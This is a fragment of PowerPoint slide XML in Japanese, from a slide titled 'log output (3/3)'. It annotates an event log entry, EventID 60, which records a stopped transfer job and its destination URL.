      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="正方形/長方形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1752600" y="3771075"/>
            <a:ext cx="8750300" cy="419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b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>③</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0" err="1"/>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t> 60 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>：転送ジョブの停止（通信先</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="直線コネクタ 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7781094" y="2430502"/>
            <a:ext cx="81680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8597901" y="2265010"/>
            <a:ext cx="337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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>③</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" smtClean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60 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：転送ジョブの停止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328832" y="5461000"/>
            <a:ext cx="5303868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04800" y="174171"/>
            <a:ext cx="407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/>
              <a:t>ログ出力（３／３）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1840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ワイド画面</PresentationFormat>
  <Paragraphs>54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2021-06-13T13:02:56Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-06-13T13:03:24Z</dcterms:modified>
</cp:coreProperties>
</file>